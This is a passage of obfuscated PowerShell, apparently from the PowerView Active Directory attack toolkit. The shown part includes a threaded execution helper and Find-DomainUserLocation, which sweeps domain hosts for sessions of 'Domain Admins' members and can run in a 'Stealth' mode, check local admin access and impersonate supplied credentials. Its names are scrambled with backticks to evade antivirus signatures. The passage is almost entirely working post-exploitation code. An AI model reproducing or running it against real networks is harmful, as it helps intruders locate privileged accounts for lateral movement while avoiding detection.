                if (${PSB`oU`N`DPaRA`M`eTerS}['LastWriteTime'] -and (${_}.LastWriteTime -lt ${L`AsTWRI`T`ETimE})) {
                    ${CONt`INUe} = ${fal`se}
                }
                if (${pSBOun`dPaRam`E`T`ERS}['CreationTime'] -and (${_}.CreationTime -lt ${Cr`eAT`I`oNti`mE})) {
                    ${C`ontIn`UE} = ${F`A`lSe}
                }
                if (${pSbO`UndPaRA`ME`TERS}['CheckWriteAccess'] -and (-not (TE`st-`WRItE -Path ${_}.FullName))) {
                    ${C`oNtiN`Ue} = ${f`Al`se}
                }
                if (${c`OnT`InUe}) {
                    ${F`iL`Epa`RAmS} = @{
                        'Path' = ${_}.FullName
                        'Owner' = $((gE`T-`ACL ${_}.FullName).Owner)
                        'LastAccessTime' = ${_}.LastAccessTime
                        'LastWriteTime' = ${_}.LastWriteTime
                        'CreationTime' = ${_}.CreationTime
                        'Length' = ${_}.Length
                    }
                    ${fO`U`NDfILE} = Ne`w-ob`je`Ct -TypeName ps`ObJE`CT -Property ${FI`lep`ARams}
                    ${FOu`N`DFiLe}.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    ${FoU`NDf`Ile}
                }
            }
        }
    }

    END {
        
        ${MaPP`e`dc`OMP`UtErS}.Keys | RE`MovE-re`moTEconnEcti`On
    }
}








function nE`W-THr`e`Adedf`UnC`TiOn {
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${Tr`Ue}, ValueFromPipeline = ${tR`Ue}, ValueFromPipelineByPropertyName = ${T`RuE})]
        [String[]]
        ${C`OMP`U`TErnamE},

        [Parameter(Position = 1, Mandatory = ${T`RuE})]
        [System.Management.Automation.ScriptBlock]
        ${S`c`RiPTBLo`cK},

        [Parameter(Position = 2)]
        [Hashtable]
        ${scR`Iptpa`Ram`EtErs},

        [Int]
        [ValidateRange(1,  100)]
        ${tHrEA`Ds} = 20,

        [Switch]
        ${noiM`p`oRts}
    )

    BEGIN {
        
        
        ${S`ES`SIoNSt`A`Te} = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        
        
        ${SEs`SIonsta`TE}.ApartmentState = [System.Threading.ApartmentState]::STA

        
        
        if (-not ${n`O`IMp`oRtS}) {
            
            ${MY`V`Ars} = gEt`-`Vari`ABlE -Scope 2

            
            ${V`orbIddenVA`RS} = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')

            
            ForEach (${v`AR} in ${my`VARs}) {
                if (${VOrb`I`Dd`eNVArS} -NotContains ${v`AR}.Name) {
                ${S`eSsionStA`Te}.Variables.Add((new`-obJE`CT -TypeName S`ySTEM.`maNaGe`menT.autOmAT`IoN.rUnsp`A`CES.seS`si`ON`sTaTEV`Ar`iABlE`e`NtRY -ArgumentList ${v`Ar}.name,${V`Ar}.Value,${V`Ar}.description,${V`AR}.options,${V`Ar}.attributes))
                }
            }

            
            ForEach (${FU`Nct`ioN} in (GET`-`cHil`DITem F`UNcT`i`ON:)) {
                ${se`Ssio`NST`Ate}.Commands.Add((Ne`W-O`BjECt -TypeName s`ySTEm.`m`ANageM`ent.au`ToMa`TI`o`N`.`RUN`SpaCes.`SEs`sion`s`TAt`efuNcT`I`ON`EntrY -ArgumentList ${f`U`Nc`TiOn}.Name, ${fU`NCT`iOn}.Definition))
            }
        }

        
        
        

        
        ${po`Ol} = [RunspaceFactory]::CreateRunspacePool(1, ${THrEA`DS}, ${sE`sS`ioNS`TATE}, ${ho`ST})
        ${pO`Ol}.Open()

        
        ${MEth`oD} = ${Nu`Ll}
        ForEach (${M} in [PowerShell].GetMethods() | w`herE-`ObJeCt { ${_}.Name -eq 'BeginInvoke' }) {
            ${me`TH`odpa`RAme`TERs} = ${m}.GetParameters()
            if ((${meTHo`dPa`RAmE`TErS}.Count -eq 2) -and ${METh`oDp`AR`AMeTerS}[0].Name -eq 'input' -and ${mE`T`hodP`AramET`E`Rs}[1].Name -eq 'output') {
                ${MEt`hod} = ${m}.MakeGenericMethod([Object], [Object])
                break
            }
        }

        ${J`ObS} = @()
        ${coM`p`UT`erNAme} = ${c`OMp`UtErna`mE} | WHE`RE`-ob`jEct {${_} -and ${_}.Trim()}
        W`RiTe-vE`RbOSE "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count)"

        
        if (${T`hReadS} -ge ${comP`UteRnA`ME}.Length) {
            ${t`H`REaDs} = ${C`Omp`UtERNamE}.Length
        }
        ${EL`EM`entSpLIt`SIze} = [Int](${C`oMP`UTeRnaME}.Length/${Thr`EA`ds})
        ${cOm`puT`E`R`N`A`MEP`ARTiTIOneD} = @()
        ${ST`ART} = 0
        ${e`ND} = ${ElEm`enTspL`itS`IzE}

        for(${i} = 1; ${i} -le ${th`ReaDS}; ${I}++) {
            ${Li`St} = New`-oBJ`ecT s`y`sTEM.`ColLEct`IoN`S`.arrAylIsT
            if (${I} -eq ${th`READs}) {
                ${e`Nd} = ${coM`PuT`er`N`AME}.Length
            }
            ${L`iSt}.AddRange(${cOm`p`U`TErNaMe}[${S`TA`RT}..(${e`ND}-1)])
            ${s`TA`RT} += ${Ele`MeNT`SPl`It`siZE}
            ${e`ND} += ${ELe`menTS`pLITS`I`Ze}
            ${cO`M`P`UTER`NaM`eP`ARtITIOned} += @(,@(${Li`sT}.ToArray()))
        }

        W`R`ITE-v`erBoSe "[New-ThreadedFunction] Total number of threads/partitions: $Threads"

        ForEach (${coMpUTe`R`N`AmePa`RT`it`ION} in ${Com`PUte`R`Na`mEPArtiTIo`NEd}) {
            
            ${POW`ERS`HEll} = [PowerShell]::Create()
            ${POW`eR`sHe`lL}.runspacepool = ${p`oOl}

            
            ${nu`ll} = ${pow`erS`H`eLL}.AddScript(${S`C`RIPtbL`ock}).AddParameter('ComputerName', ${c`O`mPuTE`RNaME`paRTiT`i`oN})
            if (${Scri`p`Tp`A`Ra`MetERS}) {
                ForEach (${pa`Ram} in ${sc`Rip`Tp`AramEtErS}.GetEnumerator()) {
                    ${N`ULl} = ${pO`wE`RShell}.AddParameter(${p`ArAM}.Name, ${p`A`RaM}.Value)
                }
            }

            
            ${Ou`T`Put} = new`-`oBj`ecT ma`N`AgEMe`NT.aUToma`T`i`on`.pSdAtacO`ll`ECtIon[OBj`EC`T]

            
            ${J`oBs} += @{
                PS = ${po`WER`Sh`elL}
                Output = ${o`Utp`Ut}
                Result = ${m`etHod}.Invoke(${p`Owe`RS`heLl}, @(${N`UlL}, [Management.Automation.PSDataCollection[Object]]${O`UtP`UT}))
            }
        }
    }

    END {
        WR`iT`E-VERbO`SE "[New-ThreadedFunction] Threads executing"

        
        Do {
            ForEach (${j`OB} in ${J`OBS}) {
                ${j`Ob}.Output.ReadAll()
            }
            sTARt`-`s`LeEP -Seconds 1
        }
        While ((${Jo`BS} | WHEre`-OB`JE`Ct { -not ${_}.Result.IsCompleted }).Count -gt 0)

        ${sleePS`eC`o`Nds} = 100
        w`RIte-VER`B`OSE "[New-ThreadedFunction] Waiting $SleepSeconds seconds for final cleanup..."

        
        for (${I}=0; ${i} -lt ${SLE`E`PSECON`ds}; ${I}++) {
            ForEach (${J`OB} in ${JO`Bs}) {
                ${J`ob}.Output.ReadAll()
                ${J`OB}.PS.Dispose()
            }
            ST`A`Rt-sL`eep -S 1
        }

        ${P`oOL}.Dispose()
        WR`ITE-Verb`O`sE "[New-ThreadedFunction] all threads completed"
    }
}


function fIND-DOMAi`NusE`R`lOC`AT`ION {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RuE}, ValueFromPipelineByPropertyName = ${TR`UE})]
        [Alias('DNSHostName')]
        [String[]]
        ${cOMPUT`ErNa`me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`omaiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`omP`Ut`erdOM`AIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Co`mP`U`T`ERLD`APFILtEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`omPUT`erSeARch`BaSe},

        [Alias('Unconstrained')]
        [Switch]
        ${c`OmputeRUN`C`oNStR`AIN`eD},

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        ${COmpUtErOperaT`INg`s`YS`TEM},

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        ${COm`puT`ersE`RvICeP`ACk},

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        ${COmPU`Tersi`T`EN`AME},

        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${uS`e`RIDent`itY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${usE`RdoM`AiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${U`SeRL`da`p`FILtER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${usErS`EAR`Ch`BASE},

        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        ${u`SE`R`GroUPI`D`EntitY} = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        ${Use`RadM`INcO`U`NT},

        [Alias('AllowDelegation')]
        [Switch]
        ${uSeRal`LO`WDeleG`A`T`Ion},

        [Switch]
        ${CHECkAC`c`ess},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${S`ERvER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${Se`ARCH`Sc`OPe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${reSu`l`T`PAgESizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SEr`VErTIm`E`LImit},

        [Switch]
        ${TOmB`STO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cre`dENT`ial} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${st`Op`oNS`U`ccESs},

        [ValidateRange(1, 10000)]
        [Int]
        ${d`e`LAy} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${j`ItteR} = .3,

        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        ${sh`O`WaLL},

        [Switch]
        ${STEA`l`TH},

        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        ${st`ea`LTHSOU`R`CE} = 'All',

        [Int]
        [ValidateRange(1, 100)]
        ${THrEa`dS} = 20
    )

    BEGIN {

        ${C`oMpUter`sE`A`RCher`ArGumENTS} = @{
            'Properties' = 'dnshostname'
        }
        if (${p`sbOunDParam`E`TE`RS}['Domain']) { ${Co`Mp`Ut`ERSeA`RCH`e`RArGu`me`NtS}['Domain'] = ${DOM`AiN} }
        if (${psBOUn`d`pAR`Am`eTErs}['ComputerDomain']) { ${ComP`UTER`seaRC`h`Erarg`UmeNtS}['Domain'] = ${c`O`mP`UtERDOMaIn} }
        if (${psboUn`DPAr`Am`e`TE`Rs}['ComputerLDAPFilter']) { ${CompUter`Sear`CHe`R`Ar`guments}['LDAPFilter'] = ${cOM`p`UtERLD`AP`F`ILTer} }
        if (${p`S`B`oUN`DParA`MEterS}['ComputerSearchBase']) { ${COm`PUT`ER`sE`Ar`C`HEr`ArgUM`ENTS}['SearchBase'] = ${C`OMp`UTe`RSe`ArC`hbaSe} }
        if (${p`SBO`UNdPara`MeT`e`Rs}['Unconstrained']) { ${Co`mP`U`TErSEaRCH`ERAr`g`UMen`Ts}['Unconstrained'] = ${Un`coNSTRa`InEd} }
        if (${pS`B`OUn`dpARAME`T`ERS}['ComputerOperatingSystem']) { ${COMpu`TeRsE`AR`Ch`erarG`UmeNtS}['OperatingSystem'] = ${o`PeraT`InGSY`stEM} }
        if (${PSbOUNDpar`A`mE`T`e`Rs}['ComputerServicePack']) { ${COmpuTeR`s`E`A`RCHe`R`ArGU`MentS}['ServicePack'] = ${sEr`Vic`EPa`Ck} }
        if (${P`S`BounDpAra`M`EtE`Rs}['ComputerSiteName']) { ${CoM`pUt`E`RsEaRc`hEr`ARgUMEnTs}['SiteName'] = ${sI`TENa`ME} }
        if (${pSBOU`NDp`A`RA`meterS}['Server']) { ${ComPuterSEar`ch`e`R`ArgUm`enTs}['Server'] = ${s`eRveR} }
        if (${psB`OunDparAmE`T`ERS}['SearchScope']) { ${CoMP`Ut`ErSE`AR`CHErarGu`me`N`TS}['SearchScope'] = ${SeAr`chS`cO`Pe} }
        if (${PS`B`OUndpAr`Ame`T`Ers}['ResultPageSize']) { ${co`MP`U`Ters`E`ArC`HE`RARguMenTs}['ResultPageSize'] = ${r`ESULtpAgES`i`ZE} }
        if (${psb`ounDpARam`E`TERs}['ServerTimeLimit']) { ${Co`MPUtERsEarcHEr`AR`guMeN`Ts}['ServerTimeLimit'] = ${s`erVERtImel`i`mIT} }
        if (${p`SBouNd`pa`Ram`ETERS}['Tombstone']) { ${c`OMputeRs`Ea`RcHERA`RGUme`NtS}['Tombstone'] = ${TOmb`S`TONE} }
        if (${PsbO`U`NdPA`RAM`e`TeRs}['Credential']) { ${Co`MPu`T`erS`eAR`c`HEraRguMEnts}['Credential'] = ${cRe`denT`i`Al} }

        ${U`S`erSEarCH`e`Ra`RgUmEnTs} = @{
            'Properties' = 'samaccountname'
        }
        if (${PS`BOUN`Dp`A`RametE`RS}['UserIdentity']) { ${users`EARch`e`RArgU`m`ents}['Identity'] = ${usEr`idENTI`Ty} }
        if (${PsBO`UNDpARAM`ETe`Rs}['Domain']) { ${useRs`eaRc`her`Arg`UmEnTs}['Domain'] = ${DO`M`AIN} }
        if (${p`Sbo`U`NdPAR`AMeTErs}['UserDomain']) { ${uSeR`SEaRcHERaR`gU`Me`NTS}['Domain'] = ${U`sERD`oMaIn} }
        if (${pSbO`UNDpAR`A`METe`Rs}['UserLDAPFilter']) { ${useRSeAr`CHeRar`Gu`me`NtS}['LDAPFilter'] = ${U`s`ErldAPF`ilT`Er} }
        if (${P`SbOUNDp`ARAmET`Ers}['UserSearchBase']) { ${U`s`ERSeAr`cHE`RarGumEnTS}['SearchBase'] = ${U`Se`RSe`ARcHbasE} }
        if (${psbO`UnD`PAraM`EtErs}['UserAdminCount']) { ${u`sErseArCh`ERarg`Um`eNtS}['AdminCount'] = ${us`ERAdm`I`NCO`UNt} }
        if (${p`S`BOun`DP`ARa`mETErs}['UserAllowDelegation']) { ${U`S`ERS`EarCHeRAR`g`Um`eNTS}['AllowDelegation'] = ${UsEra`l`lO`wdEle`GAtIon} }
        if (${p`SBOUND`pARamE`T`ERS}['Server']) { ${UsERSea`R`Ch`ErArGum`E`N`Ts}['Server'] = ${se`R`VEr} }
        if (${psBou`N`D`pArameterS}['SearchScope']) { ${Use`RSea`RcHErAR`g`U`meNTS}['SearchScope'] = ${S`E`ArcHScOPe} }
        if (${psbOU`NdP`ARaMe`TErs}['ResultPageSize']) { ${USERSE`AR`cHe`RA`RG`U`MeNtS}['ResultPageSize'] = ${r`E`sult`paG`eSIZE} }
        if (${PSbO`Un`dPA`RaMe`T`eRS}['ServerTimeLimit']) { ${USers`EaRCHE`RAR`G`Um`entS}['ServerTimeLimit'] = ${S`ERVErTiMELI`m`IT} }
        if (${psb`Oun`d`PARAmE`T`ERS}['Tombstone']) { ${USERSea`RChErar`gUm`eN`TS}['Tombstone'] = ${ToMbs`T`ONe} }
        if (${psb`OuN`d`pAr`AM`ETerS}['Credential']) { ${U`SE`R`S`EaRCHerA`RgUmeN`Ts}['Credential'] = ${c`RE`D`eNTIAL} }

        ${ta`RgeTcOMPU`TE`RS} = @()

        
        if (${pSbo`U`NDpAr`AMeT`ers}['ComputerName']) {
            ${tARGet`coMP`UteRs} = @(${COmpu`Te`RnA`me})
        }
        else {
            if (${PsBO`Undp`Ar`A`MeteRS}['Stealth']) {
                WRiT`E-`VER`BOSe "[Find-DomainUserLocation] Stealth enumeration using source: $StealthSource"
                ${TarGetC`oM`PU`TERARrA`ylIsT} = new-`ob`JE`ct sYsT`em`.ColLEct`iONS.aRr`Ay`liST

                if (${sTE`AL`THs`ouRCE} -match 'File|All') {
                    wr`i`T`E-veRb`OsE '[Find-DomainUserLocation] Querying for file servers'
                    ${fILEs`ERVeRSEa`RC`hE`Ra`RgUMeNTs} = @{}
                    if (${Psb`OUNdpARAmE`Te`RS}['Domain']) { ${fiLeserverSEaRC`He`RAr`GUMen`Ts}['Domain'] = ${dOMA`iN} }
                    if (${pSbo`UNd`pA`RamET`ERS}['ComputerDomain']) { ${fIlesE`R`VeRsEARCh`ERARG`UmentS}['Domain'] = ${cOM`put`Erdo`MaIN} }
                    if (${PSBoU`NDP`Aram`e`TerS}['ComputerSearchBase']) { ${fi`L`EseR`V`erseAr`CHeR`ArGuMEN`Ts}['SearchBase'] = ${Co`m`pU`T`E`RS`EarChbaSE} }
                    if (${pSBo`UNdpaR`AME`TE`Rs}['Server']) { ${f`iLesE`RvErs`EA`RCHEr`A`Rgum`EN`TS}['Server'] = ${SER`VER} }
                    if (${PsbO`UNDP`ARAm`ET`ErS}['SearchScope']) { ${fiLeS`e`RVERseA`R`Che`RARG`UmENtS}['SearchScope'] = ${SEar`CHSc`opE} }
                    if (${ps`BOU`N`DParaM`eterS}['ResultPageSize']) { ${Fil`eS`eRV`ersEARcHer`ARG`UME`Nts}['ResultPageSize'] = ${REs`ULtPageS`iZe} }
                    if (${PSBO`U`NdPARa`M`ET`eRs}['ServerTimeLimit']) { ${fI`leSerVeRSEar`ch`ERARgum`EN`TS}['ServerTimeLimit'] = ${SeRveR`TI`ME`L`i`MIt} }
                    if (${pSbo`UndPaRamet`E`RS}['Tombstone']) { ${file`s`Erv`E`RSeaR`CH`erArguM`EntS}['Tombstone'] = ${tom`BstO`Ne} }
                    if (${P`SbOU`ND`P`ARaMeTE`RS}['Credential']) { ${f`i`LeseR`VeRSeArc`he`RA`RGuments}['Credential'] = ${cre`DEN`TIAl} }
                    ${FiL`eS`ERVERS} = GE`T-`d`O`maInFI`LESErVER @FileServerSearcherArguments
                    if (${F`IlesERve`Rs} -isnot [System.Array]) { ${fI`Les`eRvers} = @(${FILEse`RV`eRs}) }
                    ${TaRgEtc`oM`p`Ut`er`ArR`AyLIST}.AddRange( ${FI`L`es`eRVeRS} )
                }
                if (${St`eAlthSO`U`R`CE} -match 'DFS|All') {
                    W`R`ite-VERbo`sE '[Find-DomainUserLocation] Querying for DFS servers'
                    
                    
                }
                if (${s`Tea`lThsoU`RCe} -match 'DC|All') {
                    W`RIt`e-v`erBo`SE '[Find-DomainUserLocation] Querying for domain controllers'
                    ${dc`SeARChE`R`ARGUM`eN`Ts} = @{
                        'LDAP' = ${tr`UE}
                    }
                    if (${PsBOUN`D`pARAm`eT`ers}['Domain']) { ${D`CSEa`RChERarg`UmenTs}['Domain'] = ${do`MA`IN} }
                    if (${psBoUN`D`PaR`AmETerS}['ComputerDomain']) { ${D`CSEar`CHERArgU`meN`TS}['Domain'] = ${c`OMpU`T`erDomaiN} }
                    if (${P`SboU`NDpARame`T`e`Rs}['Server']) { ${Dc`SEarcheRArGuME`N`Ts}['Server'] = ${s`E`RVeR} }
                    if (${PSb`oU`NdPa`RA`MeTers}['Credential']) { ${DCSEaRCHerAr`guM`E`NTS}['Credential'] = ${cRE`dE`NTiAl} }
                    ${Do`MaI`NC`OnTROLLErs} = Get-D`oMaiNCon`TR`OLLER @DCSearcherArguments | SEl`ecT-oB`jeCt -ExpandProperty Dnsho`st`NAmE
                    if (${d`O`mAI`N`conTr`oLlerS} -isnot [System.Array]) { ${dO`MA`iNCONTROlle`Rs} = @(${doM`Ain`C`oNtroll`ErS}) }
                    ${tAr`gEt`C`Omp`U`TeRAr`RAyLI`ST}.AddRange( ${D`Om`AInCO`N`TroLLers} )
                }
                ${Tar`G`eT`Com`puTERS} = ${ta`RgEtCo`MP`UTERArRAY`LiST}.ToArray()
            }
            else {
                WR`itE-vEr`BOSe '[Find-DomainUserLocation] Querying for all computers in the domain'
                ${tArGEt`c`o`mPUTErS} = GE`T-Do`maiNcoM`PUTeR @ComputerSearcherArguments | seleCT-OB`j`Ect -ExpandProperty D`NSHoSTNa`Me
            }
        }
        wrI`Te-`V`ErB`Ose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"
        if (${T`ARgE`T`compUTErS}.Length -eq 0) {
            throw '[Find-DomainUserLocation] No hosts found to enumerate'
        }

        
        if (${Ps`BOU`NDpaRAMEt`ERS}['Credential']) {
            ${C`U`R`Rentuser} = ${cred`En`T`IAl}.GetNetworkCredential().UserName
        }
        else {
            ${c`UrRen`TusER} = ([Environment]::UserName).ToLower()
        }

        
        if (${P`S`BO`UnDpaRamETe`RS}['ShowAll']) {
            ${tA`RGeTu`serS} = @()
        }
        elseif (${Ps`B`OuNdParAm`et`eRS}['UserIdentity'] -or ${p`SBO`UndparAmET`ERS}['UserLDAPFilter'] -or ${PSbouNd`pa`R`Amete`Rs}['UserSearchBase'] -or ${psBoUNdPAR`A`Me`TERs}['UserAdminCount'] -or ${pSBOun`D`parAM`eTeRS}['UserAllowDelegation']) {
            ${tarGE`Tu`S`ERs} = G`ET`-doma`in`UseR @UserSearcherArguments | Sel`ecT-`oBjecT -ExpandProperty sa`maCc`oUNt`Name
        }
        else {
            ${G`RoupS`EarcH`ER`ARguMe`NTs} = @{
                'Identity' = ${USErG`R`o`UpIde`N`TITY}
                'Recurse' = ${tR`Ue}
            }
            if (${pS`Bo`Un`d`pARA`METErS}['UserDomain']) { ${GR`Ou`PSeaRChErar`G`U`m`ENtS}['Domain'] = ${uS`Erdom`A`iN} }
            if (${P`sBO`UNdPA`Ram`EteRS}['UserSearchBase']) { ${gR`ouP`se`Ar`cHEraR`Gum`entS}['SearchBase'] = ${US`E`RSEARC`h`Base} }
            if (${p`s`B`OU`NDpA`RameTerS}['Server']) { ${Gro`Up`sEarch`e`Rar`GUMEN`TS}['Server'] = ${Ser`VER} }
            if (${p`sbouNd`PaRAmEtE`RS}['SearchScope']) { ${gRoU`P`seaRcH`ERarG`U`M`entS}['SearchScope'] = ${s`EA`RCHscO`Pe} }
            if (${P`SbOuNd`pAr`AM`ETers}['ResultPageSize']) { ${g`Ro`UpSeArcHe`RaRG`U`M`eNTS}['ResultPageSize'] = ${rEsu`ltpA`ge`sIZE} }
            if (${Psbo`UNDp`ARA`M`etE`RS}['ServerTimeLimit']) { ${GrouPsEA`RcHERaR`gu`m`e`NtS}['ServerTimeLimit'] = ${SErVEr`T`I`M`ElIMiT} }
            if (${p`S`BOunDp`Ar`AmeT`ERS}['Tombstone']) { ${G`R`oUp`se`ARC`hErA`RguMe`NTS}['Tombstone'] = ${tO`mBS`TONE} }
            if (${PSbo`U`NDpArAMe`T`e`RS}['Credential']) { ${G`RO`UPSeARC`HErarGUMe`N`TS}['Credential'] = ${cRE`d`ent`iAL} }
            ${tAr`geTu`S`erS} = ge`T-DOmAinGroUp`m`EMBEr @GroupSearcherArguments | selE`ct-ObjE`CT -ExpandProperty me`mBe`RNa`ME
        }

        WRITE-v`E`RBoSe "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length)"
        if ((-not ${shOW`ALL}) -and (${T`A`R`gETUsers}.Length -eq 0)) {
            throw '[Find-DomainUserLocation] No users found to target'
        }

        
        ${Ho`st`e`NumBlock} = {
            Param(${c`O`MPuTeRNAME}, ${tAr`GEt`USe`RS}, ${cU`R`RE`NtuSER}, ${S`TEAl`Th}, ${Toke`Nh`ANdLE})

            if (${T`oKE`NHaNdle}) {
                
                ${Nu`LL} = iNVO`Ke-`USERimperSona`T`Ion -TokenHandle ${TOK`ENhAnd`lE} -Quiet
            }

            ForEach (${ta`RGE`TCompu`TER} in ${c`oMPUtE`R`Na`ME}) {
                ${up} = tEST-cO`NnECT`i`on -Count 1 -Quiet -ComputerName ${t`ARgE`TCo`MPU`TeR}
                if (${U`p}) {
                    ${s`eSSIONS} = G`eT-N`Et`sESsION -ComputerName ${T`ArGe`T`COMPUt`ER}
                    ForEach (${sES`sI`On} in ${SE`s`S`iONS}) {
                        ${UserNa`me} = ${SE`sS`ioN}.UserName
                        ${cNA`ME} = ${S`e`ssIon}.CName

                        if (${C`Na`mE} -and ${c`Na`ME}.StartsWith('\\')) {
                            ${c`NA`me} = ${C`NaMe}.TrimStart('\')
                        }

                        
                        if ((${uS`eR`N`AME}) -and (${us`eRn`AMe}.Trim() -ne '') -and (${U`se`Rn`AMe} -notmatch ${curReN`Tu`sEr}) -and (${Use`R`NAmE} -notmatch '\$$')) {

                            if ( (-not ${tar`gEtu`SERs}) -or (${tARGe`T`Us`ers} -contains ${uSeR`N`AMe})) {
                                ${USE`RloC`At`i`ON} = n`EW-`oBJECt PSO`Bj`ECt
                                ${u`SERloc`At`iON} | aDD-`mEMb`ER NOT`epRopE`RTY 'UserDomain' ${nU`ll}
                                ${us`e`Rl`O`CaTion} | ad`d-ME`MbeR nOt`EPRo`PERTy 'UserName' ${Us`er`NamE}
                                ${USeR`loCaTi`On} | AdD-Mem`B`er nOTEp`R`oPERty 'ComputerName' ${TarG`Et`co`m`putER}
                                ${us`erloCATI`on} | aD`D-Memb`eR N`O`T`ePROpERtY 'SessionFrom' ${c`NA`ME}

                                
                                try {
                                    ${cnA`MeDNS`NA`me} = [System.Net.Dns]::GetHostEntry(${C`N`AME}) | S`eleCT`-obJeCT -ExpandProperty hoS`T`NaME
                                    ${useRL`O`CaTiOn} | Ad`d-MEMB`ER NotEPROp`e`RtY 'SessionFromName' ${cn`Amed`NSnamE}
                                }
                                catch {
                                    ${usER`lo`C`ATION} | Add`-Mem`BEr nOTEp`Rop`E`RTy 'SessionFromName' ${n`ULL}
                                }

                                
                                if (${cH`EcK`Acc`ess}) {
                                    ${Ad`M`In} = (T`EST-A`Dmi`NAC`cESs -ComputerName ${CNA`mE}).IsAdmin
                                    ${uSeR`lOc`A`TiON} | Ad`D-meMb`eR noTePR`oP`erTY 'LocalAdmin' ${a`dMin}.IsAdmin
                                }
                                else {
                                    ${U`SeRl`oC`AtION} | ADd-Mem`B`Er not`ePROpEr`TY 'LocalAdmin' ${n`UlL}
                                }
                                ${us`ERlocA`TI`on}.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                ${US`er`l`OcATI`on}
                            }
                        }
                    }
                    if (-not ${S`TeA`lTh}) {
                        
                        ${logGe`d`ON} = GET-nETlO`g`gEDON -ComputerName ${T`A`RGETC`OMpUT`er}
                        ForEach (${us`ER} in ${L`o`ggE`doN}) {
                            ${USErN`AmE} = ${US`Er}.UserName
                            ${u`Serd`OmAIN} = ${u`ser}.LogonDomain

                            
                            if ((${U`sER`NaME}) -and (${u`SERnamE}.trim() -ne '')) {
                                if ( (-not ${ta`RGETu`sErs}) -or (${TA`RG`E`TuseRS} -contains ${u`se`RnamE}) -and (${u`Se`Rn`AMe} -notmatch '\$$')) {
                                    ${IP`AD`DReSs} = @(rEsolvE-i`P`Ad`D`ReSS -ComputerName ${tAr`getcO`MPU`TeR})[0].IPAddress
                                    ${U`Se`R`LOCAtiOn} = n`EW-O`BJ`EcT p`S`OBJecT
                                    ${U`sERlOC`ATION} | A`Dd`-mEMber note`PrOpE`R`TY 'UserDomain' ${UsE`RDOM`AIn}
                                    ${us`Er`LOc`ATI`ON} | Ad`D-ME`MbER NOtep`R`OPERTY 'UserName' ${use`RN`A`Me}
                                    ${USe`RloC`At`ioN} | a`dd`-M`EmBer nOTE`pR`Op`Erty 'ComputerName' ${tAr`geTc`OMpU`T`ER}
                                    ${usERL`O`c`AtIoN} | ad`D`-mEMBeR nO`T`EPrOP`ertY 'IPAddress' ${ip`Ad`D`RESS}
                                    ${USErLO`C`AtIon} | AdD-`mEM`BEr No`Te`P`RopeRtY 'SessionFrom' ${nu`lL}
                                    ${Use`RloCaT`I`on} | aDd-`m`eMBer NO`TePRoPER`Ty 'SessionFromName' ${NU`Ll}

                                    
                                    if (${CHEcKACC`e`sS}) {
                                        ${ad`MIn} = t`E`st-`ADmiNacCE`Ss -ComputerName ${t`Ar`GeTcOMP`UteR}
                                        ${u`S`eRLOCa`TI`on} | add`-meM`Ber N`OTePr`opE`Rty 'LocalAdmin' ${A`dmIn}.IsAdmin
                                    }
                                    else {
                                        ${Use`Rl`OCaTiOn} | A`DD-`M`eMber No`Te`pro`pERTy 'LocalAdmin' ${n`ULL}
                                    }
                                    ${use`Rl`OCATiOn}.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    ${USE`RLO`cA`T`ion}
                                }
                            }
                        }
                    }
                }
            }

            if (${tO`ke`Nh`AnDle}) {
                invOk`E-REvERTT`oS`E`lF
            }
        }

        ${lOGonto`k`En} = ${n`ULL}
        if (${ps`BOUnd`Pa`RaMeTERS}['Credential']) {
            if (${p`s`BOUnDPaRaMe`T`ERS}['Delay'] -or ${pSB`Ou`N`d`pArA`meTeRs}['StopOnSuccess']) {
                ${LO`G`On`TOKEN} = i`NvoK`e`-us`ERi`mpe`RSO`NAtION -Credential ${cRED`en`TIAL}
            }
            else {
                ${lOGO`NTO`ken} = iNVo`k`e-`UsErIMpe`Rs`ONaTIOn -Credential ${Cr`edenti`Al} -Quiet
            }
        }
    }

